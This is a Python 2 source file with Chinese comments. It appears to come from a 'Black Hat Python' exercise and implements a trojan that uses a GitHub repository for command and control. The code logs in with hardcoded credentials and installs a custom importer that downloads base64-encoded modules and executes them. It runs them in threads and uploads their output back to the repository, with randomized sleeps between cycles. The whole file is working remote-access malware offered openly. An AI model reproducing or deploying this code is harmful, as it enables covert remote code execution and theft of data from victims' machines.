#!/usr/bin/env python
#-*- coding:utf-8 -*-

#主循环检测是否有任务执行，没有则调用get_trojan_config获取配置文件
#get_trojan_config调用get_file_contents传入路径获得配置，执行import语句
#触发GitImporter()，连接github，创建模块放入sys.module
#模块导入完，开启线程执行模块run函数，上传数据至github

import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

#木马的id，以便导入配置文件
trojan_id = "trojan_1"

trojan_config = "%s.json" % trojan_id
#储存数据路径
data_path = "data/%s/" % trojan_id
trojan_modules = []

task_queue = Queue.Queue()
configured = False

#github导入总类
class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""
    #导入模块
    def find_module(self, fullname, path=None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            #调用get_file_contents获取配置文件
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                #进行base64解码
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None
    #加载模块
    def load_module(self, name):
        #创建新模块
        module = imp.new_module(name)
        #模块代码放入模块对象中
        exec self.current_module_code in module.__dict__

        #模块放入sys
        sys.modules[name] = module

        return module

#连接github
def connect_to_github():
    gh = login(username="blackhatpythonbook", password="justin1234")
    #获得代码库对象
    repo = gh.repository("blackhatpythonbook", "chapter7")
    branch = repo.branch("master")

    return gh, repo, branch

#获得github文件，配置或module
def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    #获得分支对象
    tree = branch.commit.commit.tree.recurse()
    #迭代各分支文件
    for filename in tree.tree:
        #如果trojan_config在分支中
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            #github控制对象
            blob = repo.blob(filename._json_data['sha'])

            return blob.content

    return None


def get_trojan_config():
    global configured
    #得到github控制对象，即配置json文件
    config_json = get_file_contents(trojan_config)
    #base64解码后载入json文件
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        #如果sys.modules没有该模块
        if task['module'] not in sys.modules:
            #执行import语句,连接github导入模块
            exec ("import %s" % task['module'])
    #返回配置文件
    return config

#上传数据至github
def store_module_result(data):
    #调用connect_to_github连接github
    gh, repo, branch = connect_to_github()

    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
    #将数据进行base64编码后，上传至remote_path
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))

    return

#执行模块
def module_runner(module):
    task_queue.put(1)
    #执行模块中的run函数，返回执行结果
    result = sys.modules[module].run()
    task_queue.get()
    #上传数据
    # store the result in our repo
    store_module_result(result)

    return


# main trojan loop
#设置sys.meta_path，github动态导入模块，优先级高于sys.path
sys.meta_path = [GitImporter()]

#主循环-------------------------------------------------------------------------------
while True:
    #模块执行中task_queue不为空，所以只能等待模块执行结束才能开始下一个循环
    if task_queue.empty():
        #获得配置文件，该函数中已执行import语句，触发GitImporter()导入模块
        config = get_trojan_config()
        #执行各模块
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
    #随机休眠一段时间
    time.sleep(random.randint(1000, 10000))
